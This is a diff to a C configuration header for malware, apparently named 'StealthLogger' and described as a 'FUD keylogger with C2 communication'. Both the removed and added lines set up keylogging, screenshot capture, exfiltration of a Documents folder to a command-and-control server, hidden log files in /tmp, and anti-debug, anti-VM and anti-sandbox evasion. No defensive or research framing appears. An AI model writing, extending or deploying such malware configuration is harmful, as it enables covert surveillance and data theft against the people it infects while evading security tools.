@@ -1,21 +1,29 @@
 #ifndef PAYLOAD_CONFIG_H
 #define PAYLOAD_CONFIG_H
 
-// Payload configuration options
-#define PAYLOAD_TYPE 1 // 1: Keylogger, 2: Screen Capture, 3: File Exfiltration, 4: System Info
-#define PAYLOAD_INTERVAL 60 // Seconds between payload executions
-#define PAYLOAD_DURATION 300 // Total payload duration in seconds
-#define PAYLOG_FILE "/tmp/.system.log" // Log file path
-#define SCREENSHOT_DIR "/tmp/.screenshots" // Screenshot directory
-#define EXFILTRATION_DIR "/home/user/Documents" // Directory to exfiltrate
-#define C2_SERVER "c2.example.com" // C2 server address
-#define C2_PORT 443 // C2 server port
+// Payload configuration
+#define PAYLOAD_VERSION "1.2.0"
+#define PAYLOAD_NAME "StealthLogger"
+#define PAYLOAD_DESCRIPTION "FUD keylogger with C2 communication"
 
-// FUD configuration
-#define ENABLE_ANTI_DEBUG 1
-#define ENABLE_ANTI_VM 1
-#define ENABLE_ANTI_SANDBOX 1
-#define ENABLE_MEMORY_SCRAMBLING 1
-#define ENABLE_STRING_ENCRYPTION 1
+// Compile-time options
+#define ENABLE_KEYLOGGER 1
+#define ENABLE_SCREENSHOT 1
+#define ENABLE_FILE_TRANSFER 1
+#define ENABLE_EVASION 1
+
+// Keylogger settings
+#define KEYLOGGER_LOG_FILE "/tmp/.system.log"
+#define KEYLOGGER_FLUSH_INTERVAL 300 // seconds
+
+// Screenshot settings
+#define SCREENSHOT_DIR "/tmp/.screenshots"
+#define SCREENSHOT_INTERVAL 600 // seconds
+
+// C2 settings
+#define C2_SERVER "c2.stealthlogger.com"
+#define C2_PORT 443
+#define C2_RECONNECT_INTERVAL 60 // seconds
+#define C2_HEARTBEAT_INTERVAL 300 // seconds
 
 #endif // PAYLOAD_CONFIG_H
